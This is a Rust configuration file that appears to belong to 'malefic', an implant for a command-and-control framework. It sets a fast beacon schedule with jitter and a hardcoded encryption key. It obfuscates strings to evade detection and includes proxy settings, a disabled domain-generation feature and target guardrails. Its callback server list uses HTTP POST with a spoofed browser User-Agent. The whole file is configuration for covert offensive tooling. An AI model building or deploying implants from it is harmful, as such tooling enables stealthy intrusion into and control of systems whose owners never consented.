mod config;

use std::collections::HashMap;
use indexmap::IndexMap;
pub use config::{
    ServerConfig,
    ProtocolType,
    TransportConfig,
    // TCP
    TcpConfig,
    SocketOptions,
    // HTTP
    HttpRequestConfig,
    // REM
    RemConfig,
    // TLS
    TlsConfig,
    ProxyConfig,
    // Guardrail
    GuardrailConfig,
};
use lazy_static::lazy_static;

lazy_static! {
    // 基础配置
    pub static ref CRON: String = obfstr::obfstr!("*/5 * * * * * *").to_string();
    pub static ref JITTER: f64 = 0.2f64;
    pub static ref NAME: String = obfstr::obfstr!("malefic").to_string();
    // 加密配置
    pub static ref KEY: Vec<u8> = obfstr::obfstr!("maliceofinternal").into();
    // 服务器容错配置
    pub static ref INIT_RETRY: u32 = 10;             // 初次注册的最大尝试次数（所有服务器数量*2轮）
    pub static ref GLOBAL_RETRY: u32 = 1000000;                // 已注册情况下的全局重试次数
    pub static ref SERVER_RETRY: u32 = 10;             // 单个服务器最大重试次数
    pub static ref USE_ENV_PROXY: bool = false;
    pub static ref PROXY_URL: String = obfstr::obfstr!("").to_string();
    pub static ref PROXY_SCHEME: String = obfstr::obfstr!("").to_string();
    pub static ref PROXY_HOST: String = obfstr::obfstr!("").to_string();
    pub static ref PROXY_PORT: String = obfstr::obfstr!("").to_string();
    pub static ref PROXY_USERNAME: String = obfstr::obfstr!("").to_string();
    pub static ref PROXY_PASSWORD: String = obfstr::obfstr!("").to_string();
    // DGA配置（已禁用）
    pub static ref DGA_ENABLE: bool = false;
    pub static ref DGA_KEY: String = String::new();
    pub static ref DGA_INTERVAL_HOURS: u32 = 2;

    pub static ref GUARDRAIL_CONFIG: GuardrailConfig = GuardrailConfig {
        ip_addresses: vec![],
        usernames: vec![],
        server_names: vec![],
        domains: vec![],
        require_all: true,
    };

    // 多服务器配置 - 使用IndexMap保持配置顺序
    pub static ref SERVER_CONFIGS: IndexMap<String, ServerConfig> = {
        let mut configs = IndexMap::new();
        configs.insert(
            obfstr::obfstr!("127.0.0.1:8080").to_string(),
            ServerConfig {
                address: obfstr::obfstr!("127.0.0.1:8080").to_string(),
                protocol: ProtocolType::Http,
                transport_config: TransportConfig::Http(HttpRequestConfig {
                    method: obfstr::obfstr!("POST").to_string(),
                    path: obfstr::obfstr!("/").to_string(),
                    version: obfstr::obfstr!("1.1").to_string(),
                    headers: {
                        let mut headers = HashMap::new();
                        headers.insert(obfstr::obfstr!("Host").to_string(), obfstr::obfstr!("127.0.0.1:8080").to_string());
                        headers.insert(obfstr::obfstr!("Content-Type").to_string(), obfstr::obfstr!("application/octet-stream").to_string());
                        headers.insert(obfstr::obfstr!("User-Agent").to_string(), obfstr::obfstr!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36").to_string());
                        headers
                    },
                }),
                tls_config: None,
                proxy_config: None,
                domain_suffix: None,
            }
        );

        configs
    };

}
